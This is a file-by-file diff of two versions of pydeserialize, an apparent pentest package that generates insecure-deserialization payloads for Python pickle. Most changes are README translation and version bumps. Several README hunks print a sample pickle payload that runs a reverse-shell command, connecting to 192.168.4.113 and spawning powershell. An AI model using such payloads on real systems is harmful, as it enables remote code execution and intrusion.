# Comparing `tmp/pydeserialize-0.0.9.tar.gz` & `tmp/pydeserialize-0.1.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pydeserialize-0.0.9.tar", max compression
+gzip compressed data, was "pydeserialize-0.1.0.tar", max compression
```

## Comparing `pydeserialize-0.0.9.tar` & `pydeserialize-0.1.0.tar`

### file list

```diff
@@ -1,8 +1,8 @@
--rw-r--r--   0        0        0     1078 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/LICENSE
--rw-r--r--   0        0        0     2878 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/README.md
--rw-r--r--   0        0        0       41 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/pydeserialize/__init__.py
--rw-r--r--   0        0        0      419 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/pydeserialize/encoded.py
--rw-r--r--   0        0        0     1664 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/pydeserialize/pydeserialize.py
--rw-r--r--   0        0        0     1449 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/pydeserialize/run.py
--rw-r--r--   0        0        0      489 2023-07-29 16:25:13.710287 pydeserialize-0.0.9/pyproject.toml
--rw-r--r--   0        0        0     3366 1970-01-01 00:00:00.000000 pydeserialize-0.0.9/PKG-INFO
+-rw-r--r--   0        0        0     1078 2023-07-29 20:26:29.864756 pydeserialize-0.1.0/LICENSE
+-rw-r--r--   0        0        0     2887 2023-07-29 20:26:29.864756 pydeserialize-0.1.0/docs/README.md
+-rw-r--r--   0        0        0       41 2023-07-29 20:26:29.884756 pydeserialize-0.1.0/pydeserialize/__init__.py
+-rw-r--r--   0        0        0      419 2023-07-29 20:26:29.884756 pydeserialize-0.1.0/pydeserialize/encoded.py
+-rw-r--r--   0        0        0     1664 2023-07-29 20:26:29.884756 pydeserialize-0.1.0/pydeserialize/pydeserialize.py
+-rw-r--r--   0        0        0     1449 2023-07-29 20:26:29.884756 pydeserialize-0.1.0/pydeserialize/run.py
+-rw-r--r--   0        0        0      494 2023-07-29 20:26:29.884756 pydeserialize-0.1.0/pyproject.toml
+-rw-r--r--   0        0        0     3375 1970-01-01 00:00:00.000000 pydeserialize-0.1.0/PKG-INFO
```

### Comparing `pydeserialize-0.0.9/LICENSE` & `pydeserialize-0.1.0/LICENSE`

 * *Files identical despite different names*

### Comparing `pydeserialize-0.0.9/README.md` & `pydeserialize-0.1.0/docs/README.md`

 * *Files 6% similar despite different names*

```diff
@@ -1,21 +1,22 @@
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
 
 [![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=pydeserialize)](https://git.io/typing-svg)
 
 
 
-<h4 align="center">Tool for testing python insecure deserialization vulnerabilities</h4>
+<h4 align="center">pydeserialize testar vulnerabilidades de desserialização insegura do python</h4>
 
 
 <p align="center">
-  <a href="#características">Features</a> •
-  <a href="#instalação">Install</a> •
-  <a href="#forma-de-utilização">How to use</a> •
-  <a href="#executando-pydeserialize">Usage</a>
+  <a href="#características">Características</a> •
+  <a href="#instalação">Instalação</a> •
+  <a href="#forma-de-utilização"> Forma de utilização</a> •
+  <a href="#detalhes">Detalhes</a> •
+  <a href="#executando-revmap">Executando revmap</a>  
 </p>
 
 ---
 
 
 O pydeserialize é uma ferramenta que gera payloads de desserialização insegura em python. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. pydeserialize é construído para fazer apenas uma coisa - gera payloads de desserialização insegura + encodes e faz isso muito bem.
 
@@ -27,22 +28,23 @@
 
 # Forma de utilização
 
 ```sh
 pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
 pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux
 ```
-Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
+
+# Detalhes 
 ```yaml
            _                 _     _ _         
  ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
 | . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
 |  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
 |_| |___|  
-     v0.0.9 - @joaoviictorti
+     v0.1.0 - @joaoviictorti
 
 options:
   -h, --help            show this help message and exit
   -ip IP                Insert ip
   -p PORT               Insert port
   -e {b64,shell,urlencode,hex} Insert encoding
   -o {Windows,Linux}    Insert operational system
@@ -62,13 +64,13 @@
 pydeserialize -ip 192.168.4.113 -p 80 -o Windows -e shell
 
            _                 _     _ _         
  ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
 | . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
 |  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
 |_| |___|  
-     v0.0.9 - @joaoviictorti
+     v0.1.0 - @joaoviictorti
 
 b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("powershell")\'\x94\x85\x94R\x94.'
 ```
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -1,35 +1,36 @@
 [https://capsule-render.vercel.app/
 api?type=waving&color=0000FF&height=120&section=header] [![Typing SVG](https://
 readme-typing-svg.herokuapp.com/
 ?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=pydeserialize)]
 (https://git.io/typing-svg)
-   *** Tool for testing python insecure deserialization vulnerabilities ***
-                 Features â¢ Install â¢ How_to_use â¢ Usage
+  *** pydeserialize testar vulnerabilidades de desserializaÃ§Ã£o insegura do
+                                  python ***
+ CaracterÃ­sticas â¢ InstalaÃ§Ã£o â¢ Forma_de_utilizaÃ§Ã£o â¢ Detalhes â¢
+                               Executando_revmap
 --- O pydeserialize Ã© uma ferramenta que gera payloads de desserializaÃ§Ã£o
 insegura em python. Possui uma funcionalidade que faz encode das payloads
 desejadas e dessa forma sendo simples e otimizada para velocidade.
 pydeserialize Ã© construÃ­do para fazer apenas uma coisa - gera payloads de
 desserializaÃ§Ã£o insegura + encodes e faz isso muito bem. Projetei o
 `pydeserialize` para cumprir todas as responsabilidades para gera payloads e
 encodes, mantive um modelo consistentemente passivo para tornÃ¡-lo Ãºtil para
 testadores de penetraÃ§Ã£o. # CaracterÃ­sticas - Gera payloads para explora
 vulnerabilidades de desserializaÃ§Ã£o insegura em python # Forma de
 utilizaÃ§Ã£o ```sh pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
-pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux ``` Isso exibirÃ¡ a ajuda
-para a ferramenta. Aqui estÃ£o todos os switches que ele suporta: ```yaml _ _ _
-_ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . | | | . | -_|_ -| -_| _| |
-.'| | |- _| -_| | _|_ |___|___|___|___|_| |_|__,|_|_|___|___| |_| |___| v0.0.9
-- @joaoviictorti options: -h, --help show this help message and exit -ip IP
-Insert ip -p PORT Insert port -e {b64,shell,urlencode,hex} Insert encoding -o
-{Windows,Linux} Insert operational system ``` # InstalaÃ§Ã£o pydeserialize
+pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux ``` # Detalhes ```yaml _
+_ _ _ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . | | | . | -_|_ -| -_|
+_| | .'| | |- _| -_| | _|_ |___|___|___|___|_| |_|__,|_|_|___|___| |_| |___|
+v0.1.0 - @joaoviictorti options: -h, --help show this help message and exit -ip
+IP Insert ip -p PORT Insert port -e {b64,shell,urlencode,hex} Insert encoding -
+o {Windows,Linux} Insert operational system ``` # InstalaÃ§Ã£o pydeserialize
 requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install pydeserialize
 ``` # Executando pydeserialize ```console pydeserialize -ip 192.168.4.113 -p 80
 -o Windows -e shell _ _ _ _ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . |
 | | . | -_|_ -| -_| _| | .'| | |- _| -_| | _|_ |___|___|___|___|_|
-|_|__,|_|_|___|___| |_| |___| v0.0.9 - @joaoviictorti
+|_|__,|_|_|___|___| |_| |___| v0.1.0 - @joaoviictorti
 b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python
 -c \'import socket,subprocess,os;s=socket.socket
 (socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2
 (s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;
 pty.spawn("powershell")\'\x94\x85\x94R\x94.' ``` [https://capsule-
 render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `pydeserialize-0.0.9/pydeserialize/pydeserialize.py` & `pydeserialize-0.1.0/pydeserialize/pydeserialize.py`

 * *Files 16% similar despite different names*

```diff
@@ -5,21 +5,21 @@
 def banner():
     return """                                                                                                                                                                                                                    
            _                 _     _ _         
  ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
 | . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
 |  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
 |_| |___|                                                                                                                                                                            
-     v0.0.9 - @joaoviictorti                                                   
+     v0.1.0 - @joaoviictorti                                                   
 """
 
 def argumentos() -> None:
     
     parse = argparse.ArgumentParser(prog=banner(),usage="pydeserialize -ip 192.168.4.113 -p 80 -o Windows -e shell",formatter_class=RawTextHelpFormatter)
-    parse.add_argument("--version",action="version",version="pydeserialize 0.0.7")
+    parse.add_argument("--version",action="version",version="pydeserialize 0.1.0")
     parse.add_argument("-ip",action="store",type=str,dest="ip",required=True, help="Insert ip")
     parse.add_argument("-p",action="store",type=str,dest="port",required=True, help="Insert port")
     parse.add_argument("-e",action="store",type=str,dest="encode",choices=["b64","shell","urlencode","hex"],default="",required=True,help="Insert encoding")
     parse.add_argument("-o",action="store",type=str,dest="SO",choices=["Windows","Linux"],required=True,help="Insert operational system")
     args = parse.parse_args()
     
     ObjetoMalicioso(args.ip,args.port,args.encode,args.SO).Objeto_Serializado()
```

### Comparing `pydeserialize-0.0.9/pydeserialize/run.py` & `pydeserialize-0.1.0/pydeserialize/run.py`

 * *Files identical despite different names*

### Comparing `pydeserialize-0.0.9/PKG-INFO` & `pydeserialize-0.1.0/PKG-INFO`

 * *Files 12% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: pydeserialize
-Version: 0.0.9
+Version: 0.1.0
 Summary: Desserialização insegura em python
 Home-page: https://github.com/joaoviictorti/pyserialize
 License: MIT
 Author: João
 Author-email: joaovictorti08@gmail.com
 Requires-Python: >=3.11,<4.0
 Classifier: License :: OSI Approved :: MIT License
@@ -15,22 +15,23 @@
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
 
 [![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=pydeserialize)](https://git.io/typing-svg)
 
 
 
-<h4 align="center">Tool for testing python insecure deserialization vulnerabilities</h4>
+<h4 align="center">pydeserialize testar vulnerabilidades de desserialização insegura do python</h4>
 
 
 <p align="center">
-  <a href="#características">Features</a> •
-  <a href="#instalação">Install</a> •
-  <a href="#forma-de-utilização">How to use</a> •
-  <a href="#executando-pydeserialize">Usage</a>
+  <a href="#características">Características</a> •
+  <a href="#instalação">Instalação</a> •
+  <a href="#forma-de-utilização"> Forma de utilização</a> •
+  <a href="#detalhes">Detalhes</a> •
+  <a href="#executando-revmap">Executando revmap</a>  
 </p>
 
 ---
 
 
 O pydeserialize é uma ferramenta que gera payloads de desserialização insegura em python. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. pydeserialize é construído para fazer apenas uma coisa - gera payloads de desserialização insegura + encodes e faz isso muito bem.
 
@@ -42,22 +43,23 @@
 
 # Forma de utilização
 
 ```sh
 pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
 pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux
 ```
-Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
+
+# Detalhes 
 ```yaml
            _                 _     _ _         
  ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
 | . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
 |  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
 |_| |___|  
-     v0.0.9 - @joaoviictorti
+     v0.1.0 - @joaoviictorti
 
 options:
   -h, --help            show this help message and exit
   -ip IP                Insert ip
   -p PORT               Insert port
   -e {b64,shell,urlencode,hex} Insert encoding
   -o {Windows,Linux}    Insert operational system
@@ -77,13 +79,13 @@
 pydeserialize -ip 192.168.4.113 -p 80 -o Windows -e shell
 
            _                 _     _ _         
  ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ 
 | . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
 |  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
 |_| |___|  
-     v0.0.9 - @joaoviictorti
+     v0.1.0 - @joaoviictorti
 
 b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("powershell")\'\x94\x85\x94R\x94.'
 ```
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -1,41 +1,42 @@
-Metadata-Version: 2.1 Name: pydeserialize Version: 0.0.9 Summary:
+Metadata-Version: 2.1 Name: pydeserialize Version: 0.1.0 Summary:
 DesserializaÃ§Ã£o insegura em python Home-page: https://github.com/
 joaoviictorti/pyserialize License: MIT Author: JoÃ£o Author-email:
 joaovictorti08@gmail.com Requires-Python: >=3.11,<4.0 Classifier: License ::
 OSI Approved :: MIT License Classifier: Programming Language :: Python :: 3
 Classifier: Programming Language :: Python :: 3.11 Requires-Dist: termcolor
 (>=2.3.0,<3.0.0) Description-Content-Type: text/markdown [https://capsule-
 render.vercel.app/api?type=waving&color=0000FF&height=120&section=header] [!
 [Typing SVG](https://readme-typing-svg.herokuapp.com/
 ?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=pydeserialize)]
 (https://git.io/typing-svg)
-   *** Tool for testing python insecure deserialization vulnerabilities ***
-                 Features â¢ Install â¢ How_to_use â¢ Usage
+  *** pydeserialize testar vulnerabilidades de desserializaÃ§Ã£o insegura do
+                                  python ***
+ CaracterÃ­sticas â¢ InstalaÃ§Ã£o â¢ Forma_de_utilizaÃ§Ã£o â¢ Detalhes â¢
+                               Executando_revmap
 --- O pydeserialize Ã© uma ferramenta que gera payloads de desserializaÃ§Ã£o
 insegura em python. Possui uma funcionalidade que faz encode das payloads
 desejadas e dessa forma sendo simples e otimizada para velocidade.
 pydeserialize Ã© construÃ­do para fazer apenas uma coisa - gera payloads de
 desserializaÃ§Ã£o insegura + encodes e faz isso muito bem. Projetei o
 `pydeserialize` para cumprir todas as responsabilidades para gera payloads e
 encodes, mantive um modelo consistentemente passivo para tornÃ¡-lo Ãºtil para
 testadores de penetraÃ§Ã£o. # CaracterÃ­sticas - Gera payloads para explora
 vulnerabilidades de desserializaÃ§Ã£o insegura em python # Forma de
 utilizaÃ§Ã£o ```sh pydeserialize -ip 192.168.4.113 -p 80 -e shell -o Windows
-pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux ``` Isso exibirÃ¡ a ajuda
-para a ferramenta. Aqui estÃ£o todos os switches que ele suporta: ```yaml _ _ _
-_ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . | | | . | -_|_ -| -_| _| |
-.'| | |- _| -_| | _|_ |___|___|___|___|_| |_|__,|_|_|___|___| |_| |___| v0.0.9
-- @joaoviictorti options: -h, --help show this help message and exit -ip IP
-Insert ip -p PORT Insert port -e {b64,shell,urlencode,hex} Insert encoding -o
-{Windows,Linux} Insert operational system ``` # InstalaÃ§Ã£o pydeserialize
+pydeserialize -ip 192.168.4.113 -e b64 -p 80 -o Linux ``` # Detalhes ```yaml _
+_ _ _ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . | | | . | -_|_ -| -_|
+_| | .'| | |- _| -_| | _|_ |___|___|___|___|_| |_|__,|_|_|___|___| |_| |___|
+v0.1.0 - @joaoviictorti options: -h, --help show this help message and exit -ip
+IP Insert ip -p PORT Insert port -e {b64,shell,urlencode,hex} Insert encoding -
+o {Windows,Linux} Insert operational system ``` # InstalaÃ§Ã£o pydeserialize
 requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install pydeserialize
 ``` # Executando pydeserialize ```console pydeserialize -ip 192.168.4.113 -p 80
 -o Windows -e shell _ _ _ _ ___ _ _ _| |___ ___ ___ ___|_|___| |_|___ ___ | . |
 | | . | -_|_ -| -_| _| | .'| | |- _| -_| | _|_ |___|___|___|___|_|
-|_|__,|_|_|___|___| |_| |___| v0.0.9 - @joaoviictorti
+|_|__,|_|_|___|___| |_| |___| v0.1.0 - @joaoviictorti
 b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python
 -c \'import socket,subprocess,os;s=socket.socket
 (socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2
 (s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;
 pty.spawn("powershell")\'\x94\x85\x94R\x94.' ``` [https://capsule-
 render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer]
```

